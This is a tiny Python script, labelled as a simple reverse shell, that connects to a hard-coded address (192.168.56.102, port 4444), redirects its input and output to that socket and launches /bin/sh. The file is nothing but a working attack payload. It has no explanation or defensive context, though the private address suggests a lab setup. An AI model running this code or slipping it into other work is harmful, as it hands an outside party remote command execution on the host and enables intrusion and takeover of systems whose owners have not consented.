"""A simple python reverse shell"""

IP = "192.168.56.102"
PORT = 4444

import sys,socket,os,pty;s=socket.socket();s.connect((IP, PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")
